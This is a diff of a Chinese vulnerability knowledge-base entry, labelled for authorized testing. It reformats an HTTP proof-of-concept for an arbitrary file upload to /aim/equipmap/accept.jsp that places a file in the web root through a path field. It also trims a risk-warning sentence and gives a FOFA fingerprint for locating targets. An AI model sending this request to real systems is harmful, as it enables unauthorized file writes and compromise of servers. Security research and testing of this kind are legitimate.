@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -75,20 +75,20 @@ CVE 会漏掉的条目。FOFA 指纹：`icon_hash="1085941792"`。
 #### PoC（来源：社区公开复现报文，仅限授权测试）
 
 ```http
-    POST /aim/equipmap/accept.jsp HTTP/1.1
-    Host: 127.0.0.1
-    Content-Type: multipart/form-data; boundary=ac1485f11aa5441defff4ab45b7fb177
+POST /aim/equipmap/accept.jsp HTTP/1.1
+Host: 127.0.0.1
+Content-Type: multipart/form-data; boundary=ac1485f11aa5441defff4ab45b7fb177
 
-    --ac1485f11aa5441defff4ab45b7fb177
-    Content-Disposition: form-data; name="upload"; filename="01356.txt"
-    Content-Type: text/plain
+--ac1485f11aa5441defff4ab45b7fb177
+Content-Disposition: form-data; name="upload"; filename="01356.txt"
+Content-Type: text/plain
 
-    875784047
-    --ac1485f11aa5441defff4ab45b7fb177
-    Content-Disposition: form-data; name="fname"
+875784047
+--ac1485f11aa5441defff4ab45b7fb177
+Content-Disposition: form-data; name="fname"
 
-    \webapps\nc_web\01356.txt
-    --ac1485f11aa5441defff4ab45b7fb177--
+\webapps\nc_web\01356.txt
+--ac1485f11aa5441defff4ab45b7fb177--
 ```
 
 上传成功后拼接路径访问即命中：`http://target/01356.txt`。
